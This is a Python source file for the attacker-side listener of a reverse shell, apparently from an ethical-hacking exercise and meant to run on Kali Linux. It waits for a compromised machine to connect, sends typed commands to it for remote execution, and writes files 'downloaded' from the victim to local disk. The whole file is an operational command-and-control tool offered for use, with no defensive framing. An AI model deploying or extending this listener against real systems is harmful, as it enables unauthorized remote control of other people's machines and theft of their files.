# This Listener stay in Kali/Linux
import socket
import json
import sys

class Listener:
    def __init__(self, ip, port):
        try:
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind((ip,port))
            listener.listen(0)
            print("[+] waiting for incoming connection.")
            self.connection, address = listener.accept()
            print("[!] Got a connection from " + str(address))
        except OSError as e:
            print(f"[!] Error to make bind in {ip}:{port}, You need insert IP and PORT available.")
            print(f"[!] Details: {e}")
            sys.exit(1)
    
    def execute_remotely(self, command):
        try:
            serialized_data = json.dumps(command)

            self.connection.sendall(serialized_data.encode())
            
            if command[0] == "exit":
                print("[+] Closing connection...")
                self.connection.close()
                exit(0)

            return self.connection.recv(1024)
        
        except Exception as e:
            print(f"[!] Comunication error: {e}")
            self.connection.close()
            exit(1)
    
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(content)
            return "[+] download successful"
    
    def run(self):
        try:
            while True:
                command = input(">> ")
                command = command.split(" ")
                result = self.execute_remotely(command)
                if command[0] == "download":
                    result = self.write_file(command[1], result)
                # .decode("latin1")
                print(result)
        except KeyboardInterrupt:
            print("\n[!] Ctrl+C detected. Close listener...")
            try:
                self.connection.close()
            except:
                pass
            exit(0)

ip = input("Ip machine to listen: ")
port = input("Choice a port for listen: ")

my_listener = Listener(ip,int(port))
my_listener.run()